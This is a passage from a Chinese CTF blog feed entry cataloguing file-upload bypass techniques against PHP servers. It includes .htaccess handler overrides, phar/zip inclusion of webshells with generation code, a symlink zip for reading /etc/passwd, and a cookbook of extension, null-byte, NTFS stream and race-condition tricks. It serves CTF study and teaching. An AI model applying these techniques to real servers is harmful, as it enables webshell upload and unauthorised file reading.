class="line">    AddType application&#x2F;x-httpd-php .jpg</span><br><span class="line">&lt;&#x2F;IfModule&gt;</span><br></pre></td></tr></table></figure></li></ul><ul><li><strong>** 构造数组绕过 **</strong><br><br>有时候后台上传代码使用到end函数和reset函数判断文件后缀。<br><br>end函数取到的是给数组的最后一次赋值的那个值，继续尝试会发现 reset 函数也是一样，第一个给数组赋值的值就是reset函数返回的值<br>end函数取到了第二个给数组赋值的值，也就是filename[0]，reset函数的值为filename[1]。<br><br>filename[1] = php<br><br>filename[0] = png<br></li></ul><h5 id="三、zip、phar文件上传"><a href="#三、zip、phar文件上传" class="headerlink" title="三、zip、phar文件上传"></a>三、zip、phar文件上传</h5><p>此类文件上传的绕过一般都是配合文件包含进行的，以压缩文件形式绕过上传限制，通过phar协议进行文件包含，执行webshell。</p><ul><li><p><strong><strong>zip上传绕过</strong></strong>：我们先创建一个php文件，里面输入<?php echo phpinfo(); ?>就行了，接下来我们把php文件压缩成zip文件，必须通过测试发现只支持上传png文件，所以我们把zip文件改成png，<br><br>(1.php→压缩→1.zip→重命名→1.png→上传),然后通过?file=phar://uploads/xxx.png/1进行文件包含。</p></li><li><p><strong><strong>phar文件上传绕过</strong></strong>：</p><p>phar文件结构<br></p><p>A stub ：可以理解为一个标志，格式为xxxHALT_COMPILER();?&gt;，前面内容不限，但必须以_HALT_COMPILER();?&gt;来结尾，否则phar扩展将无法识别这个文件为phar文件。</p><p>A manifest describing the contents ：phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方。</p><p>The file contents ：被压缩文件的内容</p><p>A signature for verifying Phar integrity ：签名，放在文件末尾</p><p>生成phar文件的示例代码：（注意：要将php.ini中的phar.readonly选项设置为Off，否则无法生成phar文件）</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class PharDemo&#123;</span><br><span class="line">    private $message;</span><br><span class="line">    public function __construct($msg)&#123;</span><br><span class="line">        $this-&gt;message &#x3D; $msg;</span><br><span class="line">    &#125;</span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        echo $this-&gt;message;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$phar &#x3D; new Phar(&quot;phar.phar&quot;);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(&quot;,GIF89a.&lt;?php __HALT_COMPILER(); ?&gt;&quot;); &#x2F;&#x2F;设置stub,可设置GIF89a.头，绕过文件后缀检测</span><br><span class="line">$o &#x3D; new PharDemo(&quot;oh oh oh !!!&quot;);</span><br><span class="line">$phar-&gt;setMetadata($o); &#x2F;&#x2F;将自定义的meta-data存入manifest</span><br><span class="line">$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); &#x2F;&#x2F;添加要压缩的文件</span><br><span class="line">&#x2F;&#x2F;签名自动计算</span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">callphar.php</span><br><span class="line">&lt;?php</span><br><span class="line">    include &#39;phar:&#x2F;&#x2F;my.phar&#x2F;shell.php&#39;;</span><br><span class="line">?&gt;</span><br><span class="line">&#x2F;&#x2F;访问callphar.php即可调用shell.php</span><br><span class="line">&#x2F;&#x2F;注意：phar文件不受文件名限制，即my.phar可以任意的重命名为aaa.bbb</span><br><span class="line">callphar.php</span><br><span class="line">&lt;?php</span><br><span class="line">    include &#39;phar:&#x2F;&#x2F;aaa.bbb&#x2F;shell.php&#39;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h5 id="五、-unlink-绕过"><a href="#五、-unlink-绕过" class="headerlink" title="五、 unlink 绕过"></a>五、 unlink 绕过</h5><p>我们首先构造一个指向 /etc/passwd 的软链接文件，看看能不能成功<br>root@ubuntu:~# ln -s /etc/passwd test</p><p>看一下软链接的指向<br>lrwxrwxrwx 1 root root 11 Nov 11 06:45 test -&gt; /etc/passwd</p><p>现在我们把这个文件进行压缩<br>root@ubuntu:~# zip -y test.zip test</p><p>上传然后 submit，借助文件包含漏洞，可任意读取相关文件，即使有open_basedir的限制。</p><h5 id="六、Cookbook"><a href="#六、Cookbook" class="headerlink" title="六、Cookbook"></a>六、Cookbook</h5><table><thead><tr><th>方式</th><th>利用方式</th></tr></thead><tbody><tr><td>前端JS检测</td><td>直接禁用JS，或者burp改包等等</td></tr><tr><td>只验证Content-type</td><td>抓包改Content-Type，修改为image/jpeg、image/png、image/gif</td></tr><tr><td>黑名单绕过</td><td>不允许上传.asp,.aspx,.php,.jsp后缀文件，但是可以上传其他任意后缀 .php .phtml .phps .php5 .pht。前提是apache的httpd.conf中有如下配置代码<br><code>AddType application/x-httpd-php .php .phtml .phps .php5 .pht</code><br>或者上传.htaccess文件<br>需要：1.mod_rewrite模块开启。2.AllowOverride All<br>文件内容<br><code>&lt;FilesMatch &quot;shell.jpg&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt;</code><br>此时上传shell.jpg文件即可被当作php来解析。<br>或者<br>AddType application/x-httpd-php .jpg</td></tr><tr><td>大小写绕过</td><td>上传Php来绕过黑名单后缀。(在Linux没有特殊配置的情况下，这种情况只有win可以，因为win会忽略大小写</td></tr><tr><td>空格绕过</td><td>Win下xx.jpg[空格] 或xx.jpg.这两类文件都是不允许存在的，若这样命名，windows会默认除去空格或点。<br>此处会删除末尾的点，但是没有去掉末尾的空格，因此上传一个.php空格文件即可</td></tr><tr><td>点绕过</td><td>没有去除末尾的点，上传.php.绕过</td></tr><tr><td>::$DATA绕过</td><td>(仅限windows)使用NTFS ADS 文件流绕过的方式，假设上传的文件内容为<?php phpinfo(); ?><br>以下是上传时候会出现的现象：<br>Test.php:a.jpg 生成Test.php 文件内容为空<br>Test.php::$DATA 生成test.php 文件内容为<?php phpinfo(); ?><br>Test.php::$INDEX_ALLOCATION 生成test.php文件夹<br>Test.php::$DATA\0.jpg 生成0.jpg 文件内容为<?php phpinfo(); ?><br>Test.php::$DATA\aaa.jpg 生成aaa.jpg 文件内容为<?php phpinfo(); ?><br><br>PS: 上传test.php:a.jpg的时候其实是在服务器上正常生成了一个数据流文件，可以通过notepad test.php:a.jpg查看内容，而test.php为空也是正常的。</td></tr><tr><td>.空格.绕过</td><td>move_upload_file的文件名直接为用户上传的文件名，我们可控。且会删除文件名末尾的点，因此我们可以结用.php.空格.来绕过。windows会忽略文件末尾的.和空格</td></tr><tr><td>/.绕过</td><td>用move_uploaded_file会忽略/.的trick绕过</td></tr><tr><td>双写绕过</td><td>敏感后缀替换为空，双写.pphphp绕过即可</td></tr><tr><td>00截断</td><td>影响版本：5.4.x&lt;= 5.4.39, 5.5.x&lt;= 5.5.23, 5.6.x &lt;= 5.6.7 <br> exp：move_uploaded_file($_FILES[‘name’][‘tmp_name’],”/file.php\x00.jpg”);<br>源码中move_uploaded_file中的save_path可控，因此00截断即可</td></tr><tr><td>图片马上传</td><td>copy smi1e.jpg /b + shell.php /a shell.jpg</td></tr><tr><td>二次渲染绕过</td><td>绕过方法可以参考先知的文章，写的很详细：<a href="https://xz.aliyun.com/t/2657" target="_blank" rel="noopener">https://xz.aliyun.com/t/2657</a><br>jpg和png很麻烦，gif只需要找到渲染前后没有变化的位置,然后将php代码写进去,就可以了。</td></tr><tr><td>条件竞争</td><td>文件先经过保存，然后判断后缀名是否在白名单中，如果不在则删除，此时可以利用条件竞争在保存文件后删除文件前来执行php文件</td></tr><tr><td>数组+/.绕过</td><td>利用reset、end函数特性以及文件数组来绕过相关检测</td></tr></tbody></table>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;基本上传思路&quot;&gt;&lt;a href=&quot;#基本上传思路&quot; class=&quot;headerlink&quot; title=&quot;基本上传思路&quot;&gt;&lt;/a&gt;基本上传思路&lt;/h4&gt;&lt;h5 id=&quot;一、前端绕过&quot;&gt;&lt;a href=&quot;#一、前端绕过&quot; class=&quot;headerlink&quot; titl
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://blog.kaide0521.cn/categories/CTF/"/>
    
    
      <category term="文件上传" scheme="https://blog.kaide0521.cn/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
</feed>
